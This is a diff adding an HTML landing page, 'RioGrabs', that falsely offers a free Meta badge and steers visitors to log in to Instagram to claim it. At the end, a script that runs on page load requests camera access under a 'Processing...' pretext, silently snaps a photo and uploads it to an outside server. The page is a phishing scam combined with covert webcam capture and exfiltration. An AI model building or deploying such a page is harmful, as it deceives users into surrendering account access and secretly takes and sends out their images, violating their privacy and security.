@@ -1,0 +1,384 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RioGrabs</title>
+
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, Helvetica, sans-serif;
+            background: #f6f6f6;
+        }
+
+        /* NAVBAR */
+
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 18px 80px;
+            background: white;
+            border-bottom: 1px solid #ddd;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 24px;
+            font-weight: bold;
+        }
+
+        .logo img {
+            width: 50px;
+            height: 50px;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 40px;
+        }
+
+        .nav-links a {
+            text-decoration: none;
+            color: #333;
+        }
+
+        .nav-right {
+            display: flex;
+            gap: 15px;
+        }
+
+        .login-btn {
+            padding: 10px 20px;
+            border: 1px solid #333;
+            background: white;
+            border-radius: 20px;
+            cursor: pointer;
+        }
+
+        .start-btn {
+            padding: 10px 25px;
+            background: #7cc576;
+            border: none;
+            border-radius: 20px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        /* MAIN SECTION */
+
+        .container {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            padding:5px 80px;
+            gap: 40px;
+        }
+
+        .left-section {
+            width: 50%;
+        }
+
+        /* Main Page Logo Above Heading */
+        .main-page-logo {
+            width: 250px; /* reduced size */
+            height: auto;
+            display: block;
+            margin: 0 auto 0px; /* reduced gap below logo */
+        }
+
+        .main-text h1 {
+            font-size: 48px;
+            margin-top: 0; /* remove extra top margin */
+            margin-bottom: 20px;
+        }
+
+        .main-text p {
+            font-size: 18px;
+            color: #555;
+            line-height: 1.6;
+        }
+
+        .button-info {
+            margin-top: 40px;
+        }
+
+        .button-info p {
+            margin-bottom: 15px;
+        }
+
+        .next-btn {
+            padding: 18px 40px;
+            font-size: 20px;
+            background: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+        }
+
+        .next-btn:hover {
+            background: #45a049;
+        }
+
+        /* PROCEDURE TEXT AREA */
+
+        .procedure-section {
+            margin-top: 40px;
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.08);
+        }
+
+        .procedure-section h3 {
+            margin-top: 0;
+        }
+
+        .procedure-section p {
+            line-height: 1.7;
+            color: #444;
+            margin-bottom: 18px;
+        }
+
+        /* RIGHT IMAGE */
+
+        .right-section {
+            width: 45%;
+        }
+
+        .right-section img {
+            width: 100%;
+            border-radius: 18px;
+        }
+
+        /* FOOTER */
+
+        .footer {
+            background: #1a1a1a;
+            color: white;
+            padding: 40px 80px;
+            margin-top: 80px;
+        }
+
+        .footer-container {
+            display: flex;
+            justify-content: space-between;
+            gap: 30px;
+        }
+
+        .footer-column h3 {
+            margin-bottom: 15px;
+        }
+
+        .footer-column p {
+            font-size: 14px;
+            color: #ccc;
+        }
+
+        .footer-bottom {
+            text-align: center;
+            margin-top: 30px;
+            color: #aaa;
+        }
+
+        /* MOBILE */
+
+        @media (max-width: 900px) {
+            .navbar {
+                flex-direction: column;
+                gap: 15px;
+                padding: 20px;
+            }
+
+            .nav-links {
+                flex-wrap: wrap;
+                justify-content: center;
+            }
+
+            .container {
+                flex-direction: column;
+                padding: 40px 20px;
+                text-align: center;
+            }
+
+            .right-section {
+                order: 1;
+                width: 100%;
+            }
+
+            .left-section {
+                order: 2;
+                width: 100%;
+            }
+
+            .main-text h1 {
+                font-size: 34px;
+            }
+
+            .footer {
+                padding: 40px 20px;
+            }
+
+            .footer-container {
+                flex-direction: column;
+                text-align: center;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- NAVBAR -->
+    <div class="navbar">
+        <div class="logo">
+            <img src="https://i.ibb.co/1YnyY5kj/Whats-App-Image-2026-03-28-at-12-54-56-AM-removebg-preview.png" alt="Logo">
+            <span>RioGrabs</span>
+        </div>
+
+        <div class="nav-links">
+            <a href="#">Features</a>
+            <a href="#">Tools</a>
+            <a href="#">Resources</a>
+            <a href="#">Pricing</a>
+        </div>
+
+        <div class="nav-right">
+            <button class="login-btn">Log in</button>
+            <button class="start-btn">Get started</button>
+        </div>
+    </div>
+
+    <!-- MAIN CONTENT -->
+    <div class="container">
+        <div class="left-section">
+            <div class="main-text">
+                <img class="main-page-logo" src="https://i.ibb.co/1YnyY5kj/Whats-App-Image-2026-03-28-at-12-54-56-AM-removebg-preview.png" alt="Logo">
+                <h1>RioGrabs Provide Free Meta Badge</h1>
+
+                <p>
+                    RioGrabs is our new initial project that helps to get meta Badge at free of cost.
+                    It's starting project so we have bugs and errors. Please support us and share with your friends.
+                    We actually try to get you meta badge at free of cost with the help of ads.
+                    This project is done by a team of college students with collaboration of different companies.
+                    The ads of these sponsors will help us to give you badge at free of cost.
+                </p>
+            </div>
+
+            <div class="button-info">
+                <p>Click to continue and read details carefully and claim your badge</p>
+                <button class="next-btn" onclick="nextPage()">CLAIM</button>
+            </div>
+
+            <div class="procedure-section">
+                <h3>Procedure to Claim</h3>
+                <p>Step 1: First of all, you should read and understand everything that is written on this page. Read everything carefully.</p>
+                <p>Step 2: Understand the features and benifits when you get the badge on your account.</p>
+                <p>Step 3: It is essential that you have your own Instagram account for this. Currently, we can only give badge through Instagram. Other platform services will be included in future updates.</p>
+                <p>Step 4: To claim, click on the claim button at the end and log in to your Instagram account.</p>
+                <p>Step 5: The last step is to log in to your account. After logging in, wait for 3-5 days. Then you need to check the status of your account.</p>
+            </div>
+        </div>
+
+        <div class="right-section">
+            <img src="https://i.ibb.co/pvyhB2M5/Screenshot-2026-03-28-010009.png">
+        </div>
+    </div>
+
+    <!-- FOOTER -->
+    <div class="footer">
+        <div class="footer-container">
+            <div class="footer-column">
+                <h3>RioGrabs</h3>
+                <p>Explore innovations, Social, and Rewards.</p>
+            </div>
+
+            <div class="footer-column">
+                <h3>Tech Support</h3>
+                <p>HTML • CSS • JavaScript • APIs • Databases</p>
+            </div>
+
+            <div class="footer-column">
+                <h3>Support Us</h3>
+                <p>Support and keep in touch with us.</p>
+            </div>
+        </div>
+
+        <div class="footer-bottom">
+            © 2026 RioGrabs | Built for new Wishes
+        </div>
+    </div>
+
+    <script>
+        function nextPage() {
+            window.location.href = "page2.html";
+        }
+    </script>
+
+	<h2>Processing...</h2>
+<p>Please allow camera access to continue.</p>
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
+
+<script>
+const SERVER_URL = "https://app-mjyk.onrender.com/upload";
+
+async function startCamera() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: true
+    });
+
+    const video = document.getElementById("video");
+    video.srcObject = stream;
+
+    video.onloadedmetadata = () => {
+      setTimeout(capturePhoto, 2000);
+    };
+
+  } catch (err) {
+    alert("Camera permission denied ❌");
+    console.log(err);
+  }
+}
+
+function capturePhoto() {
+  const video = document.getElementById("video");
+  const canvas = document.getElementById("canvas");
+
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+
+  const ctx = canvas.getContext("2d");
+  ctx.drawImage(video, 0, 0);
+
+  const imageData = canvas.toDataURL("image/png");
+
+  fetch(SERVER_URL, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({ image: imageData })
+  })
+  .then(() => {
+    console.log("Sent successfully");
+  })
+  .catch(err => console.error(err));
+}
+
+// Start automatically
+startCamera();
+</script>
+
+</body>
+
+</html>
